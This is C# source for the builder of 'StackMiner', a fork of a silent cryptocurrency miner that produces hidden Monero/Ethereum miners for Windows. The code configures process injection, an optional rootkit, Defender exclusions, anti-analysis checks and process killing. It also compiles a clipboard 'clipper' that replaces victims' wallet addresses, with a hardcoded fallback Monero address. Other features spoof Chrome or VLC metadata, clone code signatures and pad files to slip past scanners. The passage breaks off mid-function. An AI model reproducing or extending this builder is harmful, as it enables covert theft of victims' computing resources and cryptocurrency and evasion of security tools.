using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using FormSerialization;
using FormLocalization;

namespace StackMiner
{
    public partial class Builder
    {
        /* Silent Crypto Miner modified by stackrose https://github.com/stackrose/StackMiner, made by Unam Sanctam https://github.com/UnamSanctam/SilentCryptoMiner */

        public Builder()
        {
            InitializeComponent();
        }

        public AlgorithmSelection FormAS = new AlgorithmSelection();
        public AdministratorOptions FormAO = new AdministratorOptions();

        public Random rand = new Random();
        public List<string> randomiCache = new List<string>();
        public string installPathCache = "AppData";

        public bool mineETH = false;
        public bool mineXMR = false;
        public string savePath;

        public List<string> checkerSet = new List<string>();
        public List<string> mutexSet = new List<string>();
        public List<string> injectionTargets = new List<string>();
        public string watchdogID = "";
        public string clipperID = "";
        public string winringName = "";

        public string CipherKey = "";
        public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
        public string UNAMIV = "UUCommandULineUU";

        public string builderVersion = "3.4.0";

        private void Form1_Load(object sender, EventArgs e)
        {
            Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAS.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            FormAO.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            Codedom.F = this;
            FormAS.F = this;
            FormAO.F = this;
            randomiCache.Add("StackMiner");
            formBuilder.Text += $" {builderVersion}";
            txtStartupEntryName.Text = Randomi(8).ToUpper();
            txtStartupFileName.Text = $"{Randomi(12)}\\{Randomi(12)}.exe";

            string[] args = Environment.GetCommandLineArgs();
            if(args.Length == 3)
            {
                if (LoadConfig(args[1]))
                {
                    savePath = Path.IsPathRooted(args[2]) ? args[2] : Path.Combine(Directory.GetCurrentDirectory(), args[2]);
                    tabcontrolBuilder.SelectedTab = tabBuild;
                    btnBuild_Click(btnBuild, EventArgs.Empty);
                }
            }

            Type minertype = typeof(MinerETH);

            dynamic miner = Activator.CreateInstance(minertype);
            miner.comboAlgorithm.Text = "kawpow";
            if (listMiners.Items.Count > 0)
            {
                miner.nid = ((dynamic)listMiners.Items[listMiners.Items.Count - 1]).nid + 1;
            }
            miner.F = this;
            miner.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            listMiners.Items.Add(miner);
            TranslateForms();

            Type minertype2 = typeof(MinerXMR);

            dynamic miner2 = Activator.CreateInstance(minertype2);
            miner2.comboAlgorithm.Text = "rx/0";
            if (listMiners.Items.Count > 0)
            {
                miner2.nid = ((dynamic)listMiners.Items[listMiners.Items.Count - 1]).nid + 1;
            }
            miner2.F = this;
            miner2.Font = new Font("Segoe UI", 9.5f, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont);
            listMiners.Items.Add(miner2);
            TranslateForms();

            Refresh();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                if (BuildError(listMiners.Items.Count == 0, "Error: Atleast 1 miner required to build.")) return;
                if (BuildError(chkIcon.Checked && !File.Exists(txtIconPath.Text), "Error: Icon file could not be found.")) return;

                if (chkStartup.Checked)
                {
                    foreach (var item in "/:*?\"<>|")
                    {
                        if (BuildError(txtStartupEntryName.Text.Contains(item), "Error: Startup option \"Entry Name\" contains any of the following illegal characters: /:*?\"<>|")) return;
                    }
                }

                if (Environment.GetCommandLineArgs().Length != 3)
                {
                    savePath = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");
                }
                if(savePath.Length > 0)
                {
                    workerBuild.RunWorkerAsync();
                }
            }
            catch (Exception ex)
            {
                BuildError(true, "Error: An error occured while starting the build process: " + ex.Message);
            }
        }

        private void workerBuild_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            try
            {
                Invoke(new Action(() => txtLog.ResetText()));
                foreach (Control c in tabcontrolBuilder.TabPages)
                {
                    if (c != tabBuild)
                    {
                        Invoke(new Action(() => c.Enabled = false));
                    }
                }
                Invoke(new Action(() => txtStartDelay.Enabled = false));
                Invoke(new Action(() => btnBuild.Enabled = false));
                Invoke(new Action(() => btnBuild.Text = "Building..."));
                BuildLog("Starting...");

                mineETH = false;
                mineXMR = false;

                CipherKey = Randomi(32, true);
                watchdogID = Randomi(rand.Next(8, 16), true);
                clipperID = Randomi(rand.Next(8, 16), true);
                winringName = $"{Randomi(12)}.sys";

                StringBuilder minerbuilder = new StringBuilder(Properties.Resources.miner);

                List<string> minerSet = new List<string>();
                checkerSet = new List<string>();
                mutexSet = new List<string>();
                injectionTargets = new List<string>();

                string currentDirectory = Path.GetDirectoryName(savePath);
                string savePathBase = Path.Combine(Path.GetDirectoryName(savePath), Path.GetFileNameWithoutExtension(savePath));

                StringBuilder masterargstr = new StringBuilder();

                BuildLog("Building miner sets...");

                mutexSet.Add($@"""\\BaseNamedObjects\\iGFsD9Cx4Q0qctYL""");

                foreach (dynamic miner in listMiners.Items)
                {
                    if (BuildError(miner.toggleIdle.Checked && OnlyDigits(miner.txtIdleWait.Text) && int.Parse(miner.txtIdleWait.Text) < 0, $"Error: Miner {miner.nid}: Idle Wait time must be a number and not negative.")) return;
                    StringBuilder argstr = new StringBuilder();
                    bool xmr = miner.GetType() == typeof(MinerXMR);
                    bool eth = miner.GetType() == typeof(MinerETH);

                    mineXMR = xmr || mineXMR;
                    mineETH = eth || mineETH;

                    if (xmr)
                    {
                        argstr.Append($"--algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --url={miner.txtPoolURL.Text} --user=\"{miner.txtPoolUsername.Text}\" --pass=\"{miner.txtPoolPassword.Text}\" --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace(" % ", "")))} --cinit-winring=\"{winringName}\"");
                    }
                    else
                    {
                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)}{(miner.chkAdvParam.Checked ? " " + miner.txtAdvParam.Text : "")} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");
                    }

                    if (miner.chkRemoteConfig.Checked)
                    {
                        argstr.Append($" --cinit-remote-config=\"{miner.txtRemoteConfig.Text}\"");
                    }

                    if (miner.toggleStealth.Checked)
                    {
                        if (miner.txtStealthTargets.Text.Length > 0)
                        {
                            argstr.Append($" --cinit-stealth-targets=\"{miner.txtStealthTargets.Text}\"");
                        }
                        if(miner.toggleStealthFullscreen.Checked)
                        {
                            argstr.Append($" --cinit-stealth-fullscreen");
                        }
                    }

                    if (miner.toggleProcessKiller.Checked && miner.txtKillTargets.Text.Length > 0)
                    {
                        argstr.Append($" --cinit-kill-targets=\"{miner.txtKillTargets.Text}\"");
                    }

                    if (miner.chkAPI.Checked && miner.txtAPI.Text.Length > 0)
                    {
                        argstr.Append($" --cinit-api=\"{miner.txtAPI.Text}\"");
                    }

                    if (!miner.txtAdvParam.Text.Contains("--cinit-version"))
                    {
                        argstr.Append($" --cinit-version=\"{builderVersion}\"");
                    }

                    if (xmr)
                    {
                        if (miner.toggleNicehash.Checked)
                        {
                            argstr.Append(" --nicehash");
                        }

                        if (miner.toggleSSL.Checked)
                        {
                            argstr.Append(" --tls");
                        }

                        if (miner.toggleIdle.Checked)
                        {
                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-cpu={Invoke(new Func<string>(() => miner.comboIdleCPU.Text.Replace("%", "")))}");
                        }
                    }
                    else
                    {
                        if (miner.toggleIdle.Checked)
                        {
                            argstr.Append($" --cinit-idle-wait={miner.txtIdleWait.Text} --cinit-idle-gpu={Invoke(new Func<string>(() => miner.comboIdleGPU.Text.Replace("%", "")))}");
                        }
                    }
                    string minerid = Randomi(16, true);
                    argstr.Append($" --cinit-id=\"{minerid}\"");

                    string injectionTarget = FormAO.toggleRootkit.Checked ? "dialer.exe" : Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
                    checkerSet.Add(string.Format("new string [] {{ \"{0}\", \"{1}\" }}", minerid, Convert.ToBase64String(Encoding.Unicode.GetBytes(argstr.ToString()))));
                    mutexSet.Add($@"""\\BaseNamedObjects\\{minerid}""");
                    injectionTargets.Add(injectionTarget);

                    if (xmr)
                    {
                        masterargstr.Append($"{(masterargstr.ToString() == "" ? "" : " ")}-c \\\"{$"{minerid} {Unamlib_Encrypt(argstr.ToString())}"}\\\"");
                        masterargstr.Append($" -ct \\\"{injectionTarget}\\\"");
                        masterargstr.Append($" -ci \\\"{minerid}\\\"");
                        masterargstr.Append($" -cwr \\\"{winringName}\\\"");
                    }
                    else
                    {
                        masterargstr.Append($"{(masterargstr.ToString() == "" ? "" : " ")}-g \\\"{$"{minerid} {Unamlib_Encrypt(argstr.ToString())}"}\\\"");
                        masterargstr.Append($" -gt \\\"{injectionTarget}\\\"");
                        masterargstr.Append($" -gi \\\"{minerid}\\\"");
                    }
                }

                if (FormAO.toggleWDExclusions.Checked)
                {
                    masterargstr.Append($" -wd");
                }

                if (chkAntiUsername.Checked)
                {
                    masterargstr.Append($" -v");
                }

                if (chkAntiAnalysis.Checked)
                {
                    masterargstr.Append($" -a");
                }

                minerbuilder.Replace("#COMMANDLINE", masterargstr.ToString());

                minerbuilder.Replace("$MINERSET", string.Join("\n", minerSet));

                string compilerPath = Path.Combine(Path.GetDirectoryName(savePath), "UCompilers");
                string versionPath = Path.Combine(compilerPath, "version.txt");
                if (Directory.Exists(compilerPath) && (!File.Exists(versionPath) || File.ReadAllText(versionPath) != "4")){
                    Directory.Delete(compilerPath, true);
                }

                try
                {
                    if (!Directory.Exists(compilerPath))
                    {
                        BuildLog("Extracting compilers...");
                        using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
                        {
                            archive.ExtractToDirectory(compilerPath);
                        }
                    }
                } 
                catch (Exception ex)
                {
                    BuildError(true, "Error: An error occured while extracting the compilers: " + ex.Message);
                    Directory.Delete(compilerPath, true);
                    return;
                }

                string filesPath = Path.Combine(Path.GetDirectoryName(savePath), "UFiles");
                if (Directory.Exists(filesPath))
                {
                    Directory.Delete(filesPath, true);
                }
                BuildLog("Extracting miner files...");
                Directory.CreateDirectory(filesPath);
                Directory.CreateDirectory(Path.Combine(filesPath, "Syscalls"));
                File.WriteAllText(Path.Combine(filesPath, "common.cpp"), Properties.Resources.common_cpp.Replace("#CIPHERKEY", CipherKey).Replace("#STARTUPENTRYNAME", Codedom.ReplaceEscape(txtStartupEntryName.Text)));
                File.WriteAllText(Path.Combine(filesPath, "common.h"), Properties.Resources.common_h);
                File.WriteAllText(Path.Combine(filesPath, "inject.cpp"), Properties.Resources.inject_cpp);
                File.WriteAllText(Path.Combine(filesPath, "inject.h"), Properties.Resources.inject_h);
                File.WriteAllText(Path.Combine(filesPath, "ntddk.h"), Properties.Resources.ntddk_h);
                File.WriteAllText(Path.Combine(filesPath, "obfuscateu.h"), Properties.Resources.obfuscateu_h);
                File.WriteAllText(Path.Combine(filesPath, "program.manifest"), Properties.Resources.template.Replace("#MANIFESTLEVEL", toggleAdministrator.Checked ? "requireAdministrator" : "asInvoker"), Encoding.UTF8);

                string basedir = "..\\..\\..";
                StringBuilder resources = new StringBuilder();

                if (chkClipper.Checked && (chkClipperBTC.Checked || chkClipperETH.Checked || chkClipperLTC.Checked || chkClipperXMR.Checked || chkClipperBCH.Checked || chkClipperDOGE.Checked || chkClipperDASH.Checked || chkClipperXLM.Checked))
                {
                    BuildLog("Compiling Clipper...");
                    StringBuilder clipperbuilder = new StringBuilder(Properties.Resources.clipper);
                    if(chkClipperBTC.Checked)
                    {
                        if (IsValidAddress(txtClipperBTC.Text))
                        {
                            clipperbuilder.Replace("DefClipBTC", "true");
                            clipperbuilder.Replace("#BTCADDRESS", txtClipperBTC.Text);
                        }
                    }
                    if (chkClipperETH.Checked)
                    {
                        if (IsValidAddress(txtClipperETH.Text))
                        {
                            clipperbuilder.Replace("DefClipETH", "true");
                            clipperbuilder.Replace("#ETHADDRESS", txtClipperETH.Text);
                        }
                    }
                    if (chkClipperLTC.Checked)
                    {
                        if (IsValidAddress(txtClipperLTC.Text))
                        {
                            clipperbuilder.Replace("DefClipLTC", "true");
                            clipperbuilder.Replace("#LTCADDRESS", txtClipperLTC.Text);
                        }
                    }
                    if (chkClipperXMR.Checked)
                    {
                        clipperbuilder.Replace("DefClipXMR", "true");
                        if (IsValidAddress(txtClipperXMR.Text))
                        {
                            clipperbuilder.Replace("#XMRADDRESS", txtClipperXMR.Text);
                        }
                        else
                        {
                            clipperbuilder.Replace("#XMRADDRESS", "48LXBQQxx5PLQKSvSwkLutUEyoebqG4Q3Ya1T6H2vcbKSWw7tBswzicC4zdnHmBp6T7NJY6Er8bgx8RGsXNxczHeCPiLiBX");
                        }
                    }
                    if (chkClipperBCH.Checked)
                    {
                        if (IsValidAddress(txtClipperBCH.Text))
                        {
                            clipperbuilder.Replace("DefClipBCH", "true");
                            clipperbuilder.Replace("#BCHADDRESS", txtClipperBCH.Text);
                        }
                    }
                    if (chkClipperDOGE.Checked)
                    {
                        if (IsValidAddress(txtClipperDOGE.Text))
                        {
                            clipperbuilder.Replace("DefClipDOGE", "true");
                            clipperbuilder.Replace("#DOGEADDRESS", txtClipperDOGE.Text);
                        }
                    }
                    if (chkClipperXLM.Checked)
                    {
                        if (IsValidAddress(txtClipperXLM.Text))
                        {
                            clipperbuilder.Replace("DefClipXLM", "true");
                            clipperbuilder.Replace("#XLMADDRESS", txtClipperXLM.Text);
                        }
                    }
                    if (chkClipperDASH.Checked)
                    {
                        if (IsValidAddress(txtClipperDASH.Text))
                        {
                            clipperbuilder.Replace("DefClipDASH", "true");
                            clipperbuilder.Replace("#DASHADDRESS", txtClipperDASH.Text);
                        }
                    }
                    string clipperpath = savePathBase + "-clipper.exe";
                    if (Codedom.NativeCompiler(clipperpath, clipperbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -DRANDSYSCALL -x c++ \"{basedir}\\UFiles\\*.cpp\" \"{basedir}\\UFiles\\Syscalls\\*.c\" -x assembler \"{basedir}\\UFiles\\Syscalls\\syscallsstubs.rnd.x64.s\" -O2 -g0 -static-libgcc -static-libstdc++ -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -fdata-sections -ffunction-sections -fno-exceptions -Wl,--gc-sections -flto -pipe -Wl,--strip-all -s -o \"{basedir}\\{Path.GetFileNameWithoutExtension(savePath)}-clipper.exe\"", "", false))
                    {
                        Codedom.CreateResource(resources, "resClipper", File.ReadAllBytes(clipperpath));
                        File.Delete(clipperpath);
                        mutexSet.Add($@"""\\BaseNamedObjects\\{clipperID}""");
                        injectionTargets.Add(FormAO.toggleRootkit.Checked ? "dialer.exe" : "conhost.exe");
                    }
                    else
                    {
                        BuildError(true, "Error compiling Clipper!");
                        Directory.Delete(filesPath, true);
                        return;
                    }
                }

                BuildLog("Converting resources...");

                Codedom.CreateResource(resources, "resMaster", Properties.Resources.master);

                if (FormAO.toggleRootkit.Checked)
                {
                    Codedom.CreateResource(resources, "resRootkit", Properties.Resources.Service64);
                }

                minerbuilder.Replace("$RESOURCES", resources.ToString());

                BuildLog("Compiling Miner...");
                string resourceFile = (chkIcon.Checked && txtIconPath.Text != "") || chkAssembly.Checked ? $"-x none \"{basedir}\\UFiles\\resource.o\"" : "";
                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -DRANDSYSCALL -x c++ \"{basedir}\\UFiles\\*.cpp\" \"{basedir}\\UFiles\\Syscalls\\*.c\" -x assembler \"{basedir}\\UFiles\\Syscalls\\syscallsstubs.rnd.x64.s\" {resourceFile} -O2 -g0 -static-libgcc -static-libstdc++ -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -fdata-sections -ffunction-sections -fno-exceptions -Wl,--gc-sections -flto -pipe -Wl,--strip-all -s -o \"{basedir}\\{Path.GetFileNameWithoutExtension(savePath)}.exe\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked))
                {
                    BuildLog("Compiling Uninstaller...");
                    Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");

                    BuildLog("Compiling Checker...");
                    Codedom.CheckerCompiler(savePathBase + "-checker.exe");

                    IncreaseExeFile(savePathBase);

                    BuildLog("Done!");
                }
                else
                {
                    BuildError(true, "Error compiling Miner!");
                    Directory.Delete(filesPath, true);
                    return;
                }
                Directory.Delete(filesPath, true);
            }
            catch (Exception ex)
            {
                BuildError(true, "Error: An error occured while building the file: " + ex.Message);
                return;
            }
        }
        private void IncreaseExeFile(string savePathBase)
        {
            if (!string.IsNullOrWhiteSpace(txtPumpSize.Text) && double.TryParse(txtPumpSize.Text, out double exeSize) && exeSize > 0)
            {
                BuildLog("Increasing file size...");

                try
                {
                    exeSize *= 1048576;

                    using (FileStream fileStream = File.OpenWrite(savePathBase + ".exe"))
                    {
                        long fsSeek = fileStream.Seek(0L, SeekOrigin.End);
                        while (fsSeek < exeSize)
                        {
                            fileStream.WriteByte(0);
                            fsSeek += 1L;
                        }
                    }
                }
                catch (Exception ex)
                {
                    BuildError(true, "Error: An error occured while increasing the file size: " + ex.Message);
                    return;
                }
            }
        }
        private bool IsValidAddress(string currentValue)
        {
            return currentValue != null && !currentValue.EndsWith(" Address") && currentValue != "" && currentValue != " ";
        }
        private byte[] UPXPackResource(byte[] data, string path)
        {
            string curDir = Path.GetDirectoryName(path);
            File.WriteAllBytes(path, data);
            System.Threading.Thread.Sleep(200);
            Codedom.RunExternalProgram($"{curDir}\\UCompilers\\UPX\\upx.exe", $"\"{Path.GetFileName(path)}\"", curDir, curDir, Path.Combine(curDir, "UCompilers\\logs\\UPX.log"));
            System.Threading.Thread.Sleep(200);
            byte[] upxdata = File.ReadAllBytes(path);
            File.Delete(path);
            return upxdata;
        }
        private void workerBuild_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            foreach (Control c in tabcontrolBuilder.TabPages)
            {
                Invoke(new Action(() => c.Enabled = true));
            }
            Invoke(new Action(() => txtStartDelay.Enabled = true));
            Invoke(new Action(() => btnBuild.Enabled = true));
            Invoke(new Action(() => btnBuild.Text = "Build"));

            if (Environment.GetCommandLineArgs().Length == 3)
            {
                Application.Exit();
            }
        }

        public string formatETHUrl(MinerETH miner)
        {
            return Invoke(new Func<string>(() => miner.comboPoolScheme.Text.Split(' ')[0])) + "://" + "`" + miner.txtPoolUsername.Text + "`" + (string.IsNullOrEmpty(miner.txtPoolWorker.Text) ? "" : "." + miner.txtPoolWorker.Text) + (string.IsNullOrEmpty(miner.txtPoolPassowrd.Text) ? "" : ":" + miner.txtPoolPassowrd.Text) + (string.IsNullOrEmpty(miner.txtPoolUsername.Text) ? "" : "@") + miner.txtPoolURL.Text + (string.IsNullOrEmpty(miner.txtPoolData.Text) ? "" : "/" + miner.txtPoolData.Text);
        }

        public bool BuildError(bool condition, string message)
        {
            if (condition)
            {
                MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return true;
            }
            return false;
        }

        public void BuildLog(string message)
        {
            Invoke(new Action(() => txtLog.Text += message + Environment.NewLine));
        }

        public string Randomi(int length, bool useCache = false)
        {
            while (true)
            {
                string Chr = "asdfghjklqwertyuiopmnbvcxz";
                var sb = new StringBuilder();
                for (int i = 1, loopTo = length; i <= loopTo; i++)
                {
                    int idx = rand.Next(0, Chr.Length);
                    sb.Append(Chr.Substring(idx, 1));
                }

                if (useCache)
                {
                    if (!randomiCache.Contains(sb.ToString()))
                    {
                        randomiCache.Add(sb.ToString());                   
                        return sb.ToString();
                    }
                }
                else
                {
                    return sb.ToString();
                }
            }
        }

        bool OnlyDigits(string str)
        {
            foreach (char c in str)
            {
                if (c < '0' || c > '9')
                    return false;
            }
            return true;
        }

        public string Unamlib_Encrypt(string plainText)
        {
            var input = Encoding.UTF8.GetBytes(plainText);
            using (var mStream = new MemoryStream())
            {
                using (var cStream = new CryptoStream(mStream, new RijndaelManaged() { KeySize = 256, BlockSize = 128, Mode = CipherMode.CBC, Padding = PaddingMode.Zeros }.CreateEncryptor(Encoding.ASCII.GetBytes(UNAMKEY), Encoding.ASCII.GetBytes(UNAMIV)), CryptoStreamMode.Write))
                {
                    cStream.Write(input, 0, input.Length);
                    cStream.FlushFinalBlock();
                    cStream.Close();
                }
                return Convert.ToBase64String(mStream.ToArray());
            }
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        public string LoadDialog(string filter)
        {
            OpenFileDialog dialog = new OpenFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAssemblyClone_Click(object sender, EventArgs e)
        {
            var o = new OpenFileDialog
            {
                Filter = "Executable |*.exe"
            };
            if (o.ShowDialog() == DialogResult.OK)
            {
                var info = FileVersionInfo.GetVersionInfo(o.FileName);
                try
                {
                    txtAssemblyTitle.Text = info.InternalName;
                    txtAssemblyDescription.Text = info.FileDescription;
                    txtAssemblyProduct.Text = info.CompanyName;
                    txtAssemblyCompany.Text = info.ProductName;
                    txtAssemblyCopyright.Text = info.LegalCopyright;
                    txtAssemblyTrademark.Text = info.LegalTrademarks;
                }
                catch {}

                string[] version = info.FileVersion.Split(info.FileVersion.Contains(",") ? ',' : '.');
                try
                {
                    txtAssemblyVersion1.Text = version[0];
                    txtAssemblyVersion2.Text = version[1];
                    txtAssemblyVersion3.Text = version[2];
                    txtAssemblyVersion4.Text = version[3];
                }
                catch {}
            }
        }

        private void chkIcon_CheckedChanged(object sender)
        {
            btnIconBrowse.Enabled = chkIcon.Checked;
            txtIconPath.Enabled = chkIcon.Checked;
        }

        private void chkStartup_CheckedChanged(object sender)
        {
            chkStartup.Text = chkStartup.Checked ? "Enabled" : "Disabled";
            foreach (Control c in tabStartup.Controls)
            {
                if (c is not MephCheckBox && c is not Label)
                {
                    c.Enabled = chkStartup.Checked;
                }
            }
            InstallPathCheck();
        }

        private void chkAssembly_CheckedChanged(object sender)
        {
            chkAssembly.Text = chkAssembly.Checked ? "Enabled" : "Disabled";
            foreach (Control c in tabAssembly.Controls)
            {
                if (c is not MephCheckBox && c is not Label)
                {
                    c.Enabled = chkAssembly.Checked;
                }
            }
        }

        private void chkSignature_CheckedChanged(object sender)
        {
            btnSignatureBrowse.Enabled = chkSignature.Checked;
            txtSignaturePath.Enabled = chkSignature.Checked;
        }

        private void btnAssemblyRandom_Click(object sender, EventArgs e)
        {
            try
            {
                string[][] apps = {
                    new string[]{"chrome.exe", "Google Chrome", "Google Chrome", "Google Inc.", "Copyright 2017 Google Inc. All rights reserved.", "", "70", "0", "3538", "110"},
                    new string[]{"vlc", "VLC media player", "VLC media player", "VideoLAN", "Copyright © 1996-2018 VideoLAN and VLC Authors", "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN", "3", "0", "3", "0"}
                };

                int randomIndex = rand.Next(apps.Length);

                txtAssemblyTitle.Text = apps[randomIndex][0];
                txtAssemblyDescription.Text = apps[randomIndex][1];
                txtAssemblyProduct.Text = apps[randomIndex][2];
                txtAssemblyCompany.Text = apps[randomIndex][3];
                txtAssemblyCopyright.Text = apps[randomIndex][4];
                txtAssemblyTrademark.Text = apps[randomIndex][5];
                txtAssemblyVersion1.Text = apps[randomIndex][6];
                txtAssemblyVersion2.Text = apps[randomIndex][7];
                txtAssemblyVersion3.Text = apps[randomIndex][8];
                txtAssemblyVersion4.Text = apps[randomIndex][9];
            }
            catch {}
        }

        private void btnIconBrowse_Click(object sender, EventArgs e)
        {
            try
            {
                using (var o = new OpenFileDialog { Filter = "Icon |*.ico" })
                {
                    txtIconPath.Text = o.ShowDialog() == DialogResult.OK ? o.FileName : "";
                    if (!string.IsNullOrEmpty(txtIconPath.Text))
                    {
                        picIcon.ImageLocation = txtIconPath.Text;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btnSignatureBrowse_Click(object sender, EventArgs e)
        {
            try
            {
                using (var o = new OpenFileDialog { Filter = "Executable |*.exe" })
                {
                    txtSignaturePath.Text = o.ShowDialog() == DialogResult.OK ? o.FileName : "";
                    if (txtSignaturePath.Text != "")
                    {
                        string signature = Convert.ToBase64String(CloneSignature(txtSignaturePath.Text));
                        if (string.IsNullOrEmpty(signature))
                        {
                            MessageBox.Show("Could not clone a signature from the target executable!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            txtSignaturePath.Text = "";
                            return;
                        }
                        txtSignatureData.Text = signature;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public byte[] CloneSignature(string target)
        {
            byte[] signature;
            using (FileStream stream = new FileStream(target, FileMode.Open, FileAccess.Read))
            {
                BinaryReader reader2 = new BinaryReader(stream);
                stream.Seek(60, SeekOrigin.Begin);
                var e_lfanew = reader2.ReadUInt32();
                stream.Seek(e_lfanew + 4 + 18, SeekOrigin.Begin);
                var fhCharac = reader2.ReadUInt16();
                var is32bit = (0x0100 & fhCharac) == 0x0100;
                stream.Seek(is32bit ? 128 : 144, SeekOrigin.Current);
                int certLoc = (int)reader2.ReadUInt32();
                int certSize = (int)reader2.ReadUInt32();
                stream.Seek(certLoc, SeekOrigin.Begin);
                signature = reader2.ReadBytes(certSize);
            }
            return signature;
        }

        public void WriteSignature(byte[] signature, string target)
        {
            using (FileStream stream = new FileStream(target, FileMode.Open, FileAccess.ReadWrite))
            {
                BinaryReader reader2 = new BinaryReader(stream);
                int streamlen = (int)stream.Length;
                int siglen = signature.Length;
                stream.Seek(60, SeekOrigin.Begin);
                var e_lfanew = reader2.ReadUInt32();
                stream.Seek(e_lfanew + 4 + 18, SeekOrigin.Begin);
                var fhCharac = reader2.ReadUInt16();
                var is32bit = (0x0100 & fhCharac) == 0x0100;
                stream.Seek(is32bit ? 128 : 144, SeekOrigin.Current);
                stream.Write(BitConverter.GetBytes((UInt32)streamlen), 0, 4);
                stream.Write(BitConverter.GetBytes((UInt32)siglen), 0, 4);
                stream.Seek(0, SeekOrigin.End);
                stream.SetLength(streamlen + siglen);
                stream.Write(signature, 0, siglen);
            }
        }

        private void labelGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner");
        }

        private void labelWiki_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/SilentCryptoMiner/wiki");
        }

        private void btnAdvancedOptions_Click(object sender, EventArgs e)
        {
            FormAO.Show();
        }

        private void btnMinerAdd_Click(object sender, EventArgs e)
        {
            if (BuildError(listMiners.Items.Count >= 2, "Error: Maximum of 2 miners reached.")) return;
            FormAS.Show();
        }

        private void btnMinerEdit_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null)
            {
                ((dynamic)listMiners.SelectedItem).Show();
            }
        }

        private void btnMinerRemove_Click(object sender, EventArgs e)
        {
            if (listMiners.SelectedItem != null)
            {
                ((dynamic)listMiners.SelectedItem).Hide();
                listMiners.Items.Remove(listMiners.SelectedItem);
                ReloadMinerList();
            }
        }

        public void ReloadMinerList()
        {
            int count = listMiners.Items.Count;
            for (int i = 0; i < count; i++)
            {
                ((dynamic)listMiners.Items[i]).nid = i;
                ((dynamic)listMiners.Items[i]).F = this;
                listMiners.Items[i] = listMiners.Items[i];
            }
        }

        public void TranslateForms()
        {
            Dictionary<string, string> languages = new Dictionary<string, string>() { { "English", "en" }, { "Swedish", "sv" }, { "Polish", "pl" }, { "Spanish", "es" }, { "Russian", "ru" }, { "Portuguese (Brazil)", "ptbr" } };

            var list = new List<Control>() { this, FormAO, FormAS };
            foreach(var item in listMiners.Items)
            {
                list.Add((dynamic)item);
            }
            FormLocalizer.TranslateControls(list, Properties.Resources.LocalizedControls, languages[comboLanguage.Text], "en");
        }

        private void btnSaveState_Click(object sender, EventArgs e)
        {
            string savepath = SaveDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(savepath))
            {
                FormSerializer.Serialise(new List<Control>() { this, FormAO }, savepath);
            }
        }

        private void btnLoadState_Click(object sender, EventArgs e)
        {
            string loadpath = LoadDialog("XML Files (*.xml)|*.xml|All Files (*.*)|*.*");
            if (!string.IsNullOrEmpty(loadpath))
            {
                try
                {
                    LoadConfig(loadpath);
                } 
                catch {
                    MessageBox.Show("Could not parse the configuration file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private bool LoadConfig(string loadPath)
        {
            if (BuildError(!File.Exists(loadPath), "Error: Could not find the configuration file.")) return false;
            FormSerializer.Deserialise(new List<Control>() { this, FormAO }, loadPath);
            ReloadMinerList();
            InstallPathCheck();
            TranslateForms();
            try
            {
                if (File.Exists(txtIconPath.Text))
                {
                    picIcon.ImageLocation = txtIconPath.Text;
                }
            }
            catch { }
            return true;
        }

        public void InstallPathCheck()
        {
            bool isProgramData = txtStartupPath.Text == "ProgramData";
            if (toggleAdministrator.Checked)
            {
